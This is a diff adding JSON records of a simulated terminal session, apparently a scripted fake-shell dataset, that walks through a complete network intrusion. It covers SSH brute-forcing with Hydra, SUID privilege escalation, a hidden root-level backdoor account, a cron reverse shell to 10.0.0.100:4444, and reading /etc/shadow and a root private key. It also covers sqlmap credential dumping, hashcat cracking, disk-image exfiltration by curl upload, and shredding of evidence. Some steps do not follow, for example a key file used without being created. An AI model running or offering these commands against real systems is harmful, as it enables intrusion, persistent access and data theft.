@@ -1,0 +1,279 @@
+ {
+        "prompt": "www-data@webserver:/var/www/html",
+        "command": "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.5",
+        "output": [
+            "   Hydra v9.3-dev (c) 2024 by van Hauser/THC & David Maciejak",
+            "   [DATA] attacking ssh://10.0.0.5:22/",
+            "   [22][ssh] host: 10.0.0.5   login: admin   password: SecurePass123!",
+            "   [STATUS] attack finished for 10.0.0.5 (valid pair found)"
+        ]
+    },
+    {
+        "prompt": "www-data@webserver:/var/www/html",
+        "command": "ssh admin@10.0.0.5",
+        "output": [
+            "Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)"
+        ]
+    },
+    {
+        "prompt": "appuser@app-server:/home/appuser",
+        "command": "sudo -l",
+        "output": [
+            "   User appuser may run the following commands on app-server:",
+            "   (ALL) NOPASSWD: /usr/bin/vuln_suid"
+        ]
+    },
+    {
+        "prompt": "appuser@app-server:/home/appuser",
+        "command": "wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -O /tmp/linpeas.sh",
+        "output": [
+            "   --2024-11-12 18:30:01--  https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh",
+            "   Resolving github.com (github.com)... 140.82.121.4",
+            "   Connecting to github.com (github.com)|140.82.121.4|:443... connected.",
+            "   HTTP request sent, awaiting response... 200 OK",
+            "   Length: 1244563 (1.2M) [text/plain]",
+            "   Saving to: ‘/tmp/linpeas.sh’",
+            "   /tmp/linpeas.sh     100%[=====================>]   1.19M  10.5MB/s    in 0.1s",
+            "   2024-11-12 18:30:01 (10.5 MB/s) - ‘/tmp/linpeas.sh’ saved [1244563/1244563]"
+        ]
+    },
+    {
+        "prompt": "appuser@app-server:/home/appuser",
+        "command": "chmod +x /tmp/linpeas.sh",
+        "output": []
+    },
+    {
+        "prompt": "appuser@app-server:/home/appuser",
+        "command": "./linpeas.sh | tee /tmp/linpeas_output.txt",
+        "output": [
+            "   Hostname: app-server",
+            "   Kernel: 5.15.0-78-generic x86_64",
+            "   OS: Ubuntu 22.04.3 LTS",
+            "   User ID: 1002(appuser)",
+            "   [+] SUID binaries:",
+            "   /usr/bin/vuln_suid"
+        ]
+    },
+    {
+        "prompt": "appuser@app-server:/home/appuser",
+        "command": "/usr/bin/vuln_suid",
+        "output": []
+    },
+    {
+        "prompt": "",
+        "command": "id",
+        "output": [
+            "   uid=0(root) gid=0(root) groups=0(root)"
+        ]
+    },
+    {
+        "prompt": "",
+        "command": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
+        "output": [
+        ]
+    },
+    {
+        "prompt": "root@app-server:/root$",
+        "command": "useradd -ou 0 -g 0 -M -r -s /bin/bash backupsvc",
+        "output": [
+            ""
+        ]
+    },
+    {
+        "prompt": "root@app-server:/root$",
+        "command": "echo \"backupsvc:RootAccess2024!\" | chpasswd",
+        "output": [
+            ""
+        ]
+    },
+    {
+        "prompt": "root@app-server:/root$",
+        "command": "echo \"* * * * * bash -i >& /dev/tcp/10.0.0.100/4444 0>&1\" | tee -a /etc/crontab",
+        "output": [
+            ""
+        ]
+    },
+    {
+        "prompt": "root@app-server:/root$",
+        "command": "cat /etc/shadow",
+        "output": [
+            "    root:$6$h7WE...S6$9B6xx...EncryptedHash:18775:0:99999:7:::",
+            "    appuser:$6$FgP3...Y7$3Z8xy...EncryptedHash:18775:0:99999:7:::"
+        ]
+    },
+    {
+        "prompt": "root@app-server:/root$",
+        "command": "cat /root/.ssh/id_rsa",
+        "output": [
+            "    -----BEGIN RSA PRIVATE KEY-----",
+            "    MIIEpQIBAAKCAQEA7G12q0...",
+            "    -----END RSA PRIVATE KEY-----"
+        ]
+    },
+    {
+        "prompt": "root@app-server:/root$",
+        "command": "scp -i /tmp/root_key /tmp/linpeas_output.txt root@10.0.0.6:/tmp/",
+        "output": [
+            "   linpeas_output.txt 100% |********************************|   14.5kB   0:00:00"
+        ]
+    },
+    {
+        "prompt": "root@app-server:/root$",
+        "command": "ssh -i /tmp/root_key root@10.0.0.6",
+        "output": [
+            "Welcome to CentOS Stream release 9 (Core)"
+        ]
+    },
+    {
+        "prompt": "dbadmin@db-server:/var/lib/mysql$",
+        "command": "tar -czf /tmp/sensitive_data.tar.gz /etc/passwd /etc/shadow /root/.ssh",
+        "output": [
+            ""
+        ]
+    },
+    {
+        "prompt": "dbadmin@db-server:/var/lib/mysql$",
+        "command": "openssl enc -aes-256-cbc -salt -in /tmp/sensitive_data.tar.gz -out /tmp/data.enc -k SuperSecretKey",
+        "output": [
+            ""
+        ]
+    },
+    {
+        "prompt": "dbadmin@db-server:/var/lib/mysql$",
+        "command": "scp -i /tmp/root_key /tmp/data.enc www-data@10.0.0.5:/tmp/",
+        "output": [
+            "   data.enc 100% |********************************|   130kB   0:00:00"
+        ]
+    },
+    {
+        "prompt": "dbadmin@db-server:/var/lib/mysql$",
+        "command": "shred -u /tmp/sensitive_data.tar.gz /tmp/data.enc /tmp/linpeas.sh /tmp/root_key",
+        "output": [
+            ""
+        ]
+    },
+    {
+        "prompt": "dbadmin@db-server:/var/lib/mysql$",
+        "command": "exit",
+        "output": [
+            ""
+        ]
+    },
+    {
+        "prompt": "root@app-server:/root$",
+        "command": "exit",
+        "output": [
+
+        ]
+    },
+    {
+        "prompt": "webadmin@webserver:/var/www/html",
+        "command": "sqlmap -u 'http://10.0.0.5/login' --data='username=admin&password=123' --dbs",
+        "output": [
+            "    sqlmap identified the following injection points:",
+            "    Parameter: username (POST)",
+            "    Type: boolean-based blind",
+            "    Title: AND boolean-based blind - WHERE or HAVING clause",
+            "    Payload: username=admin' AND 1234=1234-- &password=123",
+            "    Available databases:",
+            "    [*] mysql",
+            "    [*] information_schema",
+            "    [*] sensitive_data"
+        ]
+    },
+    {
+        "prompt": "webadmin@webserver:/var/www/html",
+        "command": "sqlmap -u 'http://10.0.0.5/login' --data='username=admin&password=123' -D sensitive_data --tables",
+        "output": [
+            "    Database: sensitive_data",
+            "    [2 tables]",
+            "    +---------------------+",
+            "    | users               |",
+            "    | transactions        |",
+            "    +---------------------+"
+        ]
+    },
+    {
+        "prompt": "webadmin@webserver:/var/www/html",
+        "command": "sqlmap -u 'http://10.0.0.5/login' --data='username=admin&password=123' -D sensitive_data -T users --columns",
+        "output": [
+            "    Table: users",
+            "    +-----------+--------------+",
+            "    | Column    | Type         |",
+            "    +-----------+--------------+",
+            "    | id        | int          |",
+            "    | username  | varchar(50)  |",
+            "    | password  | varchar(255) |",
+            "    +-----------+--------------+"
+        ]
+    },
+    {
+        "prompt": "webadmin@webserver:/var/www/html",
+        "command": "sqlmap -u 'http://10.0.0.5/login' --data='username=admin&password=123' -D sensitive_data -T users -C username,password --dump",
+        "output": [
+            "    Database: sensitive_data",
+            "    Table: users",
+            "    [2 entries]",
+            "    +----------+------------------+",
+            "    | username | password         |",
+            "    +----------+------------------+",
+            "    | admin    | hashedPass123!   |",
+            "    | user1    | Passw0rd123      |",
+            "    +----------+------------------+"
+        ]
+    },
+    {
+        "prompt": "webadmin@webserver:/var/www/html",
+        "command": "hashcat -m 0 -a 0 /tmp/password_hashes.txt /usr/share/wordlists/rockyou.txt --force",
+        "output": [
+            "    Hashes: 2 digests; 2 unique digests, 2 unique salts",
+            "    Recovered: 1/2 (50%) Digests",
+            "    Progress: 1024/14344384 (0.01%)",
+            "    Recovered: admin:SecurePass123!"
+        ]
+    },
+    {
+        "prompt": "webadmin@webserver:/var/www/html",
+        "command": "scp -i /tmp/root_key /etc/passwd root@10.0.0.10:/tmp/",
+        "output": [
+            "    passwd                              100% |***************|   5.2kB  00:00:00"
+        ]
+    },
+    {
+        "prompt": "root@db-server:/root$",
+        "command": "dd if=/dev/sda1 of=/tmp/disk_image.img bs=1M",
+        "output": [
+            "    2048+0 records in",
+            "    2048+0 records out",
+            "    2147483648 bytes (2.1 GB) copied, 10.2471 s, 209 MB/s"
+        ]
+    },
+    {
+        "prompt": "root@db-server:/root$",
+        "command": "gzip /tmp/disk_image.img",
+        "output": [
+            "    /tmp/disk_image.img.gz 100% |********************|   1.5GB   0:00:30"
+        ]
+    },
+    {
+        "prompt": "root@db-server:/root$",
+        "command": "curl -X POST -F \"file=@/tmp/disk_image.img.gz\" http://10.0.0.100/upload",
+        "output": [
+            "    100 1500M    0 1500M    0     0  45.6M      0 --:--:--  0:00:32 --:--:-- 45.6M",
+            "    Upload complete."
+        ]
+    },
+    {
+        "prompt": "root@db-server:/root$",
+        "command": "shred -u /tmp/disk_image.img.gz",
+        "output": [
+            ""
+        ]
+    },
+    {
+        "prompt": "root@db-server:/root$",
+        "command": "exit",
+        "output": [
+            ""
+        ]
+    }
